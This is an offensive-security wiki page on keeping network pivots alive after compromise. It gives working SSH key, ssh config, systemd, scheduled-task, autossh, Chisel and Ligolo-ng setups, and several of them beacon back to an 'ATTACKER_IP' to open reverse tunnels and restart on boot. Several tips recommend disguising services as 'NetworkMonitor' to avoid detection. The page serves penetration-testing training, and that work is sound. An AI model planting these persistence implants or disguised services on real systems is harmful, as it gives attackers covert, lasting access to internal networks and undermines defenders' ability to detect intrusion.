---
authors: felixbillieres, H4tsuM1ku
category: infra
---

# Persistence

## Theory

Maintaining pivot access is crucial for long-term operations. Pivots can be lost due to system reboots, connection timeouts, or detection. Implementing persistence ensures continued access to internal networks.

> [!NOTE]
> Before implementing persistence, ensure that a pivot has been established using one of the [techniques](techniques/port-forwarding.md).

Persistence mechanisms include:
* SSH key-based authentication
* Service creation for automatic tunnel establishment
* Scheduled tasks for tunnel maintenance
* Configuration files for automatic reconnection
* Ligolo-ng agent persistence

## Practice

### SSH key persistence

SSH keys can be configured for passwordless access to pivot hosts.

```bash
# Generate SSH key pair
ssh-keygen -t rsa -b 4096 -f ~/.ssh/pivot_key

# Copy public key to pivot host
ssh-copy-id -i ~/.ssh/pivot_key.pub $USER@$PIVOT_HOST

# Or manually add to authorized_keys
cat ~/.ssh/pivot_key.pub | ssh $USER@$PIVOT_HOST "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

# Use key for connections
ssh -i ~/.ssh/pivot_key -N -L 8080:$TARGET:80 $USER@$PIVOT_HOST
```

### SSH config persistence

Create SSH configuration for automatic pivot setup.

```bash
# ~/.ssh/config
Host pivot1
    HostName $PIVOT_HOST
    User $USER
    IdentityFile ~/.ssh/pivot_key
    LocalForward 8080 192.168.1.100:80
    LocalForward 3389 192.168.1.50:3389
    DynamicForward 1080
    ServerAliveInterval 60
    ServerAliveCountMax 3

# Connect and automatically set up forwards
ssh pivot1
```

### Service creation

System services can be created to maintain SSH tunnels automatically.

::: tabs

=== UNIX-like

A systemd service can be created to maintain SSH tunnels on Linux systems.

```bash
# /etc/systemd/system/pivot-tunnel.service
[Unit]
Description=SSH Pivot Tunnel
After=network.target

[Service]
Type=simple
User=myuser
Environment="TARGET_HOST=192.168.1.100"
Environment="PIVOT_HOST=10.0.0.50"
Environment="SSH_USER=admin"
ExecStart=/usr/bin/ssh -N -L 8080:${TARGET_HOST}:80 -L 3389:${TARGET_HOST}:3389 -D 1080 ${SSH_USER}@${PIVOT_HOST}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

# Enable and start service
systemctl enable pivot-tunnel.service
systemctl start pivot-tunnel.service
```

> [!WARNING]
> In systemd services, shell variables like `$USER` and `$TARGET` are not expanded. Use explicit values or `Environment` directives. For SSH key authentication, use `IdentityFile` in SSH config or `-i` flag with absolute path.

=== Windows

Scheduled tasks can be created to maintain tunnels on Windows systems.

```powershell
# Create scheduled task for plink tunnel
$action = New-ScheduledTaskAction -Execute "plink.exe" -Argument "-N -L 8080:192.168.1.100:80 -L 3389:192.168.1.100:3389 -D 1080 admin@10.0.0.50 -pw MyPassword123"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "$ENV:USERDOMAIN\$ENV:USERNAME" -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName "PivotTunnel" -Action $action -Trigger $trigger -Principal $principal
```

> [!WARNING]
> Using `-pw` stores credentials in clear text in scheduled tasks and command history. Prefer SSH key authentication or encrypted credential storage when possible.

:::

### Autossh for automatic reconnection

Autossh can be used to automatically reconnect SSH tunnels.

```bash
# Install autossh
# Debian/Ubuntu
apt install autossh

# macOS
brew install autossh

# Create persistent tunnel
autossh -M 20000 -N -L 8080:$TARGET:80 -o ExitOnForwardFailure=yes $USER@$PIVOT_HOST

# With SSH config
autossh -M 20000 -o ExitOnForwardFailure=yes pivot1
```

> [!TIP]
> The `-M` flag specifies a monitoring port for autossh. Use `-o ExitOnForwardFailure=yes` to ensure autossh restarts if port forwarding fails.

### Chisel persistence

Chisel can be configured to automatically reconnect using systemd services.

```bash
# Create systemd service for Chisel
# /etc/systemd/system/chisel-client.service
[Unit]
Description=Chisel Client
After=network.target

[Service]
Type=simple
User=myuser
Environment="ATTACKER_IP=10.0.0.100"
Environment="ATTACKER_PORT=8000"
ExecStart=/usr/local/bin/chisel client ${ATTACKER_IP}:${ATTACKER_PORT} R:1080:socks
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

# Enable and start
systemctl enable chisel-client.service
systemctl start chisel-client.service
```

> [!TIP]
> Use innocuous service names (e.g., "network-monitor" instead of "chisel-client") and configure appropriate restart policies to maintain persistence while avoiding detection.

### Ligolo-ng persistence

Ligolo-ng agents can be configured to automatically reconnect and maintain persistent connections.

::: tabs

=== UNIX-like

A systemd service can be created to maintain Ligolo-ng agent connections.

```bash
# Create systemd service for Ligolo-ng agent
# /etc/systemd/system/ligolo-agent.service
[Unit]
Description=Ligolo-ng Agent
After=network.target

[Service]
Type=simple
User=myuser
Environment="ATTACKER_IP=10.0.0.100"
ExecStart=/usr/local/bin/ligolo-ng_agent_linux_amd64 -connect ${ATTACKER_IP}:11601 -ignore-cert
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

# Enable and start
systemctl enable ligolo-agent.service
systemctl start ligolo-agent.service
```

> [!TIP]
> Use innocuous service names and configure appropriate restart policies. Ligolo-ng provides better persistence capabilities compared to traditional SOCKS proxies due to its connection management.

=== Windows

A scheduled task can be created to maintain Ligolo-ng agent connections on Windows.

```powershell
# Create scheduled task for Ligolo-ng agent
$action = New-ScheduledTaskAction -Execute "C:\path\to\ligolo-ng_agent_windows_amd64.exe" -Argument "-connect 10.0.0.100:11601 -ignore-cert"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "$ENV:USERDOMAIN\$ENV:USERNAME" -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName "NetworkMonitor" -Action $action -Trigger $trigger -Principal $principal
```

> [!TIP]
> Use innocuous task names (e.g., "NetworkMonitor" instead of "LigoloAgent") to avoid detection.

:::

> [!TIP]
> Ligolo-ng provides better persistence capabilities compared to traditional SOCKS proxies due to its connection management and automatic reconnection features.

### Persistence scripts

Scripts can be created for easy pivot re-establishment.

```bash
#!/bin/bash
# pivot.sh - Re-establish pivot connections

# SSH tunnels
ssh -f -N -L 8080:$TARGET:80 $USER@$PIVOT_HOST
ssh -f -N -L 3389:$TARGET:3389 $USER@$PIVOT_HOST
ssh -f -N -D 1080 $USER@$PIVOT_HOST

# Verify tunnels are active
netstat -tuln | grep -E "8080|3389|1080"
```

### Health checks

Pivot connections should be monitored to ensure they remain active. Implement health checks to detect and recover from failures.

```bash
# Test port forwarding connectivity
nc -zv localhost 8080 || systemctl restart pivot-tunnel.service

# Test SOCKS proxy connectivity
proxychains curl -I http://$TARGET || systemctl restart chisel-client.service

# Re-add Ligolo routes after reboot
ligolo-ng > ifconfig routes add $TARGET_NETWORK/$CIDR
```

### Monitoring pivot health

Pivot connections can be monitored to ensure they remain active.

::: tabs

=== Ligolo-ng

Ligolo-ng provides built-in session monitoring in the proxy interface.

```bash
# In Ligolo-ng proxy interface
ligolo-ng > session
ligolo-ng > list

# Check agent status
ligolo-ng > session
ligolo-ng > info
```

=== SSH / SOCKS Proxy

Traditional SSH tunnels and SOCKS proxies can be monitored using system commands.

```bash
# Check SSH tunnel status
ps aux | grep "ssh.*-L\|ssh.*-D"

# Test tunnel connectivity
curl -I http://localhost:8080

# Monitor network connections
netstat -an | grep ESTABLISHED

# Check proxychains connectivity
proxychains curl -I http://$TARGET
```

=== Windows

Windows-specific monitoring commands.

```powershell
# Check SSH/plink processes
Get-Process | Where-Object {$_.ProcessName -like "*plink*" -or $_.ProcessName -like "*ssh*"}

# Test network connectivity
Test-NetConnection -ComputerName $TARGET -Port 80
```

:::

## Resources

* [Choosing a technique](choosing-a-technique.md) - Select pivoting method
* [Techniques](techniques/port-forwarding.md) - Implementation details
* [Operations](operations.md) - Perform operations via persistent pivots

